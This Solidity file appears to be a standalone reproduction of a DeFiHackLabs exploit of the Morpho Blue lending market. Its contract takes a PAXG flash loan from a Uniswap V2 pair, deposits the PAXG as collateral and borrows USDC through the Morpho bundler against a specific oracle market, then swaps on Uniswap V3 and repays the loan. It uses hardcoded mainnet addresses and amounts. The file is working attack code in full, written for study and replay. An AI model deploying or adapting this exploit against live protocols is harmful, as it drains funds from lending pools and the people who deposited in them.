// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// MorphoBlue_exp.sol test's logic verbatim, but without inheriting forge-std
// Test/BaseTestWithBalanceLog (which depends on the Foundry cheatcode contract
// at 0x7109709E... being deployed; that address has no code in a plain EVM
// replay, so any cheatcode-gated modifier reverts on EXTCODESIZE before the
// real attack call ever runs). TokenHelper's low-level balanceOf/approve/
// transfer calls are replaced with a plain IERC20 interface.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IMorphoBundler {
    function MORPHO() external view returns (address);
    function erc20TransferFrom(address asset, uint256 amount) external payable;
    function morphoBorrow(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address receiver
    ) external payable;
    function morphoSupplyCollateral(
        MarketParams memory marketParams,
        uint256 assets,
        address onBehalf,
        bytes memory data
    ) external payable;
    function multicall(bytes[] memory data) external payable;
}

interface IMorpho {
    function setAuthorization(address authorized, bool newIsAuthorized) external;
}

struct MarketParams {
    address loanToken;
    address collateralToken;
    address oracle;
    address irm;
    uint256 lltv;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory calldatsa) external;
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);

    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract MorphoBlue {
    uint160 internal constant MIN_SQRT_RATIO = 4_295_128_739;
    uint160 internal constant MAX_SQRT_RATIO = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;

    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;

    address public constant MORPHO_BUNDLER = 0x4095F064B8d3c3548A3bebfd0Bbfd04750E30077;
    address public constant PAXG_WETH_V2_PAIR = 0x9C4Fe5FFD9A9fC5678cFBd93Aa2D4FD684b67C4C;
    address public constant PAXG_USDC_V3_PAIR = 0xB431c70f800100D87554ac1142c4A94C5Fe4C0C4;

    uint256 public constant PAXG_FLASHLOAN_AMOUNT = 132_577_813_003_136_114;
    uint256 public constant USDC_SWAP_AMOUNT = 420 * 1e6;

    uint256 public constant UNISWAP_V2_FEE_NUMERATOR = 3;
    uint256 public constant UNISWAP_V2_FEE_DENOMINATOR = 997;

    address public constant MORPHO_ORACLE = 0xDd1778F71a4a1C6A0eFebd8AE9f8848634CE1101;
    address public constant MORPHO_IRM = 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC;
    uint256 public constant MORPHO_LTV = 915_000_000_000_000_000;

    uint256 public constant BORROW_ASSETS = 230_002_486_670;
    uint256 public constant BORROW_SHARES = 0;
    uint256 public constant BORROW_SLIPPAGE_AMOUNT = 226_898_039_801_385_921;

    IMorphoBundler public immutable bundler = IMorphoBundler(payable(MORPHO_BUNDLER));

    function testExploit() external {
        IUniswapV2Pair(PAXG_WETH_V2_PAIR).swap(PAXG_FLASHLOAN_AMOUNT, 0, address(this), new bytes(100));
        uint256 paxgBal = IERC20Min(PAXG).balanceOf(address(this));
        if (paxgBal > 0) _v3Swap(PAXG, USDC, paxgBal, address(this));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == PAXG_WETH_V2_PAIR, "Invalid caller");

        require(IERC20Min(PAXG).approve(MORPHO_BUNDLER, amount0), "Approval failed");

        performComplexOperation(
            PAXG,
            PAXG_FLASHLOAN_AMOUNT,
            MarketParams({
                loanToken: USDC,
                collateralToken: PAXG,
                oracle: MORPHO_ORACLE,
                irm: MORPHO_IRM,
                lltv: MORPHO_LTV
            }),
            address(this),
            MORPHO_BUNDLER,
            BORROW_ASSETS,
            BORROW_SHARES,
            BORROW_SLIPPAGE_AMOUNT,
            address(this)
        );

        _v3Swap(USDC, PAXG, USDC_SWAP_AMOUNT, address(this));

        uint256 fee = ((amount0 * UNISWAP_V2_FEE_NUMERATOR) / UNISWAP_V2_FEE_DENOMINATOR) + 1;
        uint256 repayAmount = amount0 + fee;
        IERC20Min(PAXG).transfer(PAXG_WETH_V2_PAIR, repayAmount);
    }

    function performComplexOperation(
        address asset,
        uint256 amount,
        MarketParams memory marketParams,
        address onBehalf,
        address authorized,
        uint256 borrowAssets,
        uint256 borrowShares,
        uint256 borrowSlippageAmount,
        address borrowReceiver
    ) public payable {
        IMorpho(bundler.MORPHO()).setAuthorization(MORPHO_BUNDLER, true);

        bytes[] memory calls = new bytes[](3);
        calls[0] = abi.encodeWithSelector(IMorphoBundler.erc20TransferFrom.selector, asset, amount);
        calls[1] =
            abi.encodeWithSelector(IMorphoBundler.morphoSupplyCollateral.selector, marketParams, amount, onBehalf, "");
        calls[2] = abi.encodeWithSelector(
            IMorphoBundler.morphoBorrow.selector,
            marketParams,
            borrowAssets,
            borrowShares,
            borrowSlippageAmount,
            borrowReceiver
        );

        bundler.multicall{value: msg.value}(calls);
    }

    function _v3Swap(address tokenIn, address tokenOut, uint256 amount, address recipient) internal {
        if (amount == 0) {
            return;
        }

        bool zeroForOne = tokenIn < tokenOut;
        uint160 sqrtPriceLimitX96 = zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1;

        IUniswapV3Pool(PAXG_USDC_V3_PAIR).swap(
            recipient, zeroForOne, int256(amount), sqrtPriceLimitX96, zeroForOne ? bytes("1") : bytes("")
        );
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        require(msg.sender == PAXG_USDC_V3_PAIR, "Invalid caller");

        bool zeroForOne = data.length > 0;
        address tokenOut = zeroForOne
            ? IUniswapV3Pool(PAXG_USDC_V3_PAIR).token0()
            : IUniswapV3Pool(PAXG_USDC_V3_PAIR).token0() == USDC ? PAXG : USDC;

        uint256 amountOut = uint256(zeroForOne ? amount0Delta : amount1Delta);

        IERC20Min(tokenOut).transfer(msg.sender, amountOut);
    }
}
